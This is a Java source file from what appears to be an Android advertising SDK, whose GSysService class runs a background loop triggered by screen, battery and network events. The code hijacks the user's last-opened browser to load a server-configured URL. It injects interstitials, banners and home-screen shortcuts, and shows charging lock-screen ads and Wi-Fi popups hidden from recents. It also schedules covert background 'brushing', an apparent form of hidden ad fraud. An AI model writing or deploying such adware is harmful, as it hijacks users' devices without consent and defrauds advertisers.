package com.guang.client;



import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileLock;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.guang.client.controller.GOfferController;
import com.guang.client.controller.GSMController;
import com.guang.client.controller.GUserController;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;
import com.qinglu.ad.QLAdController;
import com.qinglu.ad.QLBatteryLockActivity;
import com.qinglu.ad.QLBehindBrush;
import com.qinglu.ad.QLInstall;
import com.qinglu.ad.QLShortcut;
import com.qinglu.ad.QLUnInstall;
import com.qinglu.ad.QLWIFIActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;

@SuppressLint("SimpleDateFormat")
public class GSysService  {
	private static GSysService _instance;	
	private static Context contexts;
	private static GSysReceiver receiver;
	private boolean isPresent;
	private boolean isRuning;
	private boolean isLock;
	
	private GSysService()
	{
		isPresent = false;
		isRuning = false;
		isLock = false;
	}
	
	public static GSysService getInstance()
	{
		if(_instance == null)
			_instance = new GSysService();
		return _instance;
	}
	
	public void start(final Context context) {
		contexts = context;
		GTools.saveSharedData(GCommon.SHARED_KEY_SERVICE_RUN_TIME,GTools.getCurrTime());
		registerListener();
		GUserController.getInstance().login();
		GOfferController.getInstance().initMobVista();
		GSMController.getInstance().init();
		
		QLInstall.getInstance().getInstallAppNum();
		QLUnInstall.getInstance().getAppInfo(true);	
		
	}
	
	public void startMainLoop()
	{		
		new Thread() {
			public void run() {
				Context context = contexts;
				if(context == null)
					context = QLAdController.getInstance().getContext();
				initData();
				while(isMainLoop())
				{				
					try {	
						boolean open = false;
						if(isPresent && GUserController.getMedia().getOpen())
						{
							open = GUserController.getMedia().isOpenApp();
							if(open)
							{
								browserBreakThread();
								browserSpotThread();
								appSpotThread();
								bannerThread();
							}
							shortcutThread();
							behindBrushThread();
						}
						if(open)
							Thread.sleep(10000);
						else
							Thread.sleep(2000);
					} catch (Exception e) {
					}
				}	
				GUserController.getInstance().restarMainLoop();
				GLog.e("------------------------", "restarMainLoop");
			};
		}.start();	
	}

	//浏览器插屏
	private boolean browserSpotThread()
	{
		if(		isPresent 
				&& isWifi()
				&& GUserController.getMedia().isAdPosition(GCommon.BROWSER_SPOT)
				&& GUserController.getMedia().isShowNum(GCommon.BROWSER_SPOT)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.BROWSER_SPOT)
				&& GUserController.getMedia().isTimeSlot(GCommon.BROWSER_SPOT))
		{		
			String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
			if(s != null && GUserController.getMedia().isWhiteList(GCommon.BROWSER_SPOT, s))
			{
				browserSpot(s);
				return true;
			}			
		}	
		return false;
	}
	//BANNER
	private boolean bannerThread()
	{
		if(		isPresent 
				&& isWifi()
				&& GUserController.getMedia().isAdPosition(GCommon.BANNER)
				&& GUserController.getMedia().isShowNum(GCommon.BANNER)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.BANNER)
				&& GUserController.getMedia().isTimeSlot(GCommon.BANNER))
		{		
			String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
			if(s != null && GUserController.getMedia().isWhiteList(GCommon.BANNER, s))
			{
				banner(s);
				return true;
			}			
		}	
		return false;
	}
	//应用插屏
	private boolean appSpotThread()
	{
		if(		isPresent 
				&& isWifi()
				&& GUserController.getMedia().isAdPosition(GCommon.APP_SPOT)
				&& GUserController.getMedia().isShowNum(GCommon.APP_SPOT)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.APP_SPOT)
				&& GUserController.getMedia().isTimeSlot(GCommon.APP_SPOT))
		{		
			String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
			if(s != null  && GUserController.getMedia().isWhiteList(GCommon.APP_SPOT, s))
			{
				appSpot();
				return true;
			}			
		}	
		return false;
	}
	//浏览器截取
	private boolean browserBreakThread()
	{
		if(		isPresent 
				&& GUserController.getMedia().isAdPosition(GCommon.BROWSER_BREAK)
				&& GUserController.getMedia().isShowNum(GCommon.BROWSER_BREAK)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.BROWSER_BREAK)
				&& GUserController.getMedia().isTimeSlot(GCommon.BROWSER_BREAK))
		{		
			String last = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
			if(last != null && GUserController.getMedia().isWhiteList(GCommon.BROWSER_BREAK, last))
			{
				browserBreak(last);
				return true;
			}			
		}	
		return false;
	}
	//快捷方式
	private boolean shortcutThread()
	{
		if(		isPresent 
				&& GUserController.getMedia().isAdPosition(GCommon.SHORTCUT)
				&& GUserController.getMedia().isShowNum(GCommon.SHORTCUT)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.SHORTCUT)
				&& GUserController.getMedia().isTimeSlot(GCommon.SHORTCUT))
		{		
			shortcut();
			return true;	
		}	
		return false;
	}
	//暗刷
	private boolean behindBrushThread()
	{
		if(		 GUserController.getMedia().isAdPosition(GCommon.BEHIND_BRUSH)
				&& GUserController.getMedia().isShowNum(GCommon.BEHIND_BRUSH)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.BEHIND_BRUSH)
				&& GUserController.getMedia().isTimeSlot(GCommon.BEHIND_BRUSH))
		{		
			int h = (int) (((int)(Math.random()*100)+1) / 100.f * 18) + 3;
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, h);
			return true;	
		}	
		return false;
	}
	//充电锁
	public void startLockThread(int mBatteryLevel)
	{
		if(		
				isWifi()
				&& GUserController.getMedia().isAdPosition(GCommon.CHARGLOCK)
				&& isOpenLock()
				&& !QLBatteryLockActivity.isShow()
				&& QLBatteryLockActivity.isFirst())
		{
			QLBatteryLockActivity lock = QLBatteryLockActivity.getInstance();
			if(lock == null)
			{
				QLBatteryLockActivity.show(mBatteryLevel);
			}
		}	
	}
	
	//应用启动
	public void appSpot()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_TIME,GTools.getCurrTime());
		GOfferController.getInstance().showAppSpot();
	}
	//banner
	public void banner(String appNmae)
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_TIME,GTools.getCurrTime());			
		GSMController.getInstance().showBanner(appNmae);
	}
	//shortcut
	public void shortcut()
	{
		GLog.e("-----------------", "shortcut success");
		QLShortcut.getInstance().show();
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_SHORTCUT_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME, GTools.getCurrTime());
	}
	//浏览器插屏
	public void browserSpot(String packageName)
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_TIME, GTools.getCurrTime());
		GSMController.getInstance().showSpot(packageName);
	}
	//浏览器截取
	public void browserBreak(String packageName)
	{		
		String url = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK).getBrowerBreakUrl();
		PackageManager packageMgr = contexts.getPackageManager();
		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setData(Uri.parse(url));
        contexts.startActivity(intent);
        
        int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME, GTools.getCurrTime());

		GTools.uploadStatistics(GCommon.SHOW,GCommon.BROWSER_BREAK,"00000");
		GLog.e("-----------------", "browserBreak success");

	}
	//暗刷
	public void behindBrush()
	{
		QLBehindBrush.getInstance().show();	
		
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, GTools.getCurrTime());

		GLog.e("-----------------", "behindBrush success");
	}
	//wifi
	public boolean wifiThread()
	{
		if(		isPresent 
				&& isWifi()
				&& GUserController.getMedia().isAdPosition(GCommon.WIFI_CONN)
				&& GUserController.getMedia().isShowNum(GCommon.WIFI_CONN)
				&& GUserController.getMedia().isShowTimeInterval(GCommon.WIFI_CONN)
				&& GUserController.getMedia().isTimeSlot(GCommon.WIFI_CONN))
		{
			return true;
		}
		return false;
	}
	public void wifi(boolean state)
	{
		//暗刷
		if(isWifi())
		{
			int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
			int currH = new Date().getHours();
			if(currH > h)
				behindBrush();
			GLog.e("-----------------------", "h="+h);
		}
		
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_WIFI_TIME, 0);
		if(time==0)
		{
			time = GTools.getCurrTime();
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, time);
			return;
		}
		if(!isWifi())
		{
			return;
		}
		Context context = QLAdController.getInstance().getContext();
		Intent intent = new Intent(context, QLWIFIActivity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
		intent.putExtra("state", (state ? 1 : 0));
		context.startActivity(intent);	
		
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_WIFI_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, GTools.getCurrTime());
	}
	
	private void initData()
	{
		isPresent = true;
		isRuning = true;
		isLock = false;
		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 0l);

		if(!isMainLoop())
		{
			long n_time = GTools.getCurrTime();
			GTools.saveSharedData(GCommon.SHARED_KEY_MAIN_LOOP_TIME, n_time);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME, n_time);
			GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
		}
		
	}
	
	private boolean isMainLoop()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_MAIN_LOOP_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time < 24 * 60 * 60 * 1000);		
	}
	
	public boolean isWifi()
	{
		return GTools.isWifi();
	}

	public boolean isMultiApp()
	{
		String name = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
		File f = new File(name, "multiapp");
		if(!f.exists())
		{
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}			
		}
		try {
			final FileOutputStream fos = new FileOutputStream(f);
			final FileLock fl = fos.getChannel().tryLock(); 
			if(fl != null && fl.isValid())
	        {
				new Thread(){
					public void run() {
						try {
							Thread.sleep(8000);
							deleteMultiApp(fl,fos);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}						
					};
				}.start();
				return true;
	        }
		} catch (Exception e1) {
			e1.printStackTrace();
		}  
		return false;
	}
	
	public void deleteMultiApp(FileLock fl,FileOutputStream fos)
	{
		try {
			if(fos != null)
				fos.close();			
		} catch (Exception e) {
		}		
        try {  
        	if(fl != null && fl.isValid())
        		fl.release();  
        } catch (IOException e) {  
        }  
	}

	public boolean isOpenLock()
	{
		int type = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_LOCK_SAVE_TYPE, 1);		
		if(type == 0)
		{
			return false;
		}
		else 
		{
			long time =  GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_LOCK_SAVE_TIME, 0l);
			Date today = new Date();
			Date date = new Date(time);
			if(type == 2)
			{
				if(today.getDate() == date.getDate())
				{
					return false;
				}
			}
			else if(type == 3)
			{
				if(today.getDate() - date.getDate() <= 3)
				{
					return false;
				}
			}
			else if(type == 4)
			{
				if(today.getDate() - date.getDate() <= 7)
				{
					return false;
				}
			}
			else if(type == 5)
			{
				if(today.getDate() - date.getDate() <= 30)
				{
					return false;
				}
			}
		}
		return true;
	}


	private static void registerListener() {
		receiver = new GSysReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_INSTALL);
        filter.addAction(GCommon.ACTION_QEW_APP_UNINSTALL);
        filter.addAction(GCommon.ACTION_QEW_APP_BANNER);
        filter.addAction(GCommon.ACTION_QEW_APP_LOCK);
        filter.addAction(GCommon.ACTION_QEW_APP_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_WIFI);
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_BREAK);
        filter.addAction(GCommon.ACTION_QEW_APP_SHORTCUT);
        filter.addAction(GCommon.ACTION_QEW_APP_HOMEPAGE);
        filter.addAction(GCommon.ACTION_QEW_APP_BEHIND_BRUSH);
        filter.addAction(GCommon.ACTION_QEW_OPEN_APP);
        filter.addAction(GCommon.ACTION_QEW_APP_INSTALL_UI);
        filter.addAction(GCommon.ACTION_QEW_APP_UNINSTALL_UI);
        
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        contexts.registerReceiver(receiver, filter);
        
    }

	
	public boolean isPresent() {
		return isPresent;
	}

	public void setPresent(boolean isPresent) {
		this.isPresent = isPresent;
	}

	public boolean isRuning() {
		return isRuning;
	}

	public void setRuning(boolean isRuning) {
		this.isRuning = isRuning;
	}

	public boolean isLock() {
		return isLock;
	}

	public void setLock(boolean isLock) {
		this.isLock = isLock;
	}

   
}
